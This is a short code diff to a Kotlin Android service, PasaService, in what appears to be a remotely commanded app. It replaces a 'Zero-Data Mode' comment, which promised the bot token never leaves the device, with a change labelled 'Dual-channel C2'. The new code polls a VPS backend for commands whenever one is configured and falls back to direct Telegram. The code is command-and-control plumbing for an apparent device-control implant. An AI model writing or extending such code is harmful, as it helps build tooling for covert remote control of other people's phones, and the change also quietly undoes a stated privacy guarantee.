@@ -386,9 +386,8 @@ class PasaService : LifecycleService() {
                     var polledSuccessfully = false
                     var commandReceivedInCycle = false
 
-                    // Zero-Data Mode: Always poll Telegram directly. Server is license-only.
-                    // botToken never leaves the device to any VPS.
-                    val shouldUseBackend = false
+                    // Dual-channel C2: Poll VPS backend gateway when configured, fallback to direct Telegram
+                    val shouldUseBackend = preferencesManager.useBackendServer || preferencesManager.serverUrl.isNotBlank()
                     if (shouldUseBackend) {
                         try {
                             val pollResp = pasaBackendApi.pollCommands(preferencesManager.deviceId, timeout = 25)
